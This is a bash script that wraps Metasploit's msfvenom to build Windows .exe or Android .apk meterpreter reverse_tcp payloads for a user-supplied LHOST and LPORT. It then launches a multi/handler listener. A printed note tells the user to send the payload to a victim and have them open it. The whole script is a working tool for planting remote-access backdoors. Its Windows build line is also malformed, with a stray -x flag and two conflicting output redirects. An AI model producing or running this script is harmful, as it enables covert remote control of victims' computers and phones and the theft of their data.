#!/bin/bash

clear

echo " Please enter the type of payload you want to choose"
echo " 1. WINDOWS payload "
echo " 2. ANDROID payload "
read -p " choose the option: " option1

clear

echo " Please enter your LHOST & LPORT "
read -p " LHOST:- " lhost
echo " Your LHOST $lhost"
read -p " LPORT:- " lport
echo " YOUR LPORT $lport"

sleep 1s
clear

echo " Where would you like to save your payload "
echo "                      OR                  "
echo " Press enter to store or save in root directory "
read -p " Enter the location:- " location

clear

echo " Enter the file name you wish to keep "
read -p " File name:- " filename

clear

if [ "$option1" = "1" ]
then
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -x > $location/$filename.exe -f exe > $filename.exe
elif [ "$option1" = "2" ]
then
   msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $location/$filename.apk
else
   exit
fi

clear

echo " // Note -- Before starting the exploit send the payload to victim and open it \\"
echo ""
echo " Do you wanna start the Exploit "
echo " 1. Yes "
echo " 2. No "
read -p " Enter the option:- " listener

if [ "$listener" = "1" ]
then
   if [ "$option1" = "1" ]
   then
      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport";
   elif [ "$option1" = "2" ]
   then
      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport";
   else
      exit
   fi
elif [ "$listener" = "2" ]
then
   exit
else
   exit
fi
